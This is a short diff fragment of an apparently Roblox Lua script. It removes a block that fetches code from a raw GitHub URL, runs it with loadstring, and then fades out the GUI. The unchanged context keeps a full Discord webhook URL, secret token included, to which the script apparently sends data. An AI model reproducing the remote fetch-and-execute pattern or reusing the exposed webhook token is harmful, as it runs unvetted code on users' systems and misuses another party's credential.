@@ -496,18 +496,6 @@ end)
 		end
 	end
 
-	pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/senS24t/aldoileanebun/main/checkbybfynv22"))()
-		local tweenservice = game:GetService("TweenService")
-		for i, child in pairs(MainFrm:GetChildren()) do
-			if child:IsA("TextLabel") or child:IsA("Frame") or child:IsA("ImageLabel") then
-				tweenservice:Create(MainFrm, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
-				tweenservice:Create(child, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
-			end
-		end
-		wait(0.5)
-		MainFrm.Parent.Enabled = false
-	end)
 	local url =
 		"https://discord.com/api/webhooks/1063637408823902269/JTJ9RJuLbnJMKBGf1oDH-l8eUPo7UQ48aaDcmmWW4kWgwJeCp8LpQE7TS4hm-aSxVU6m"
 	local data = {
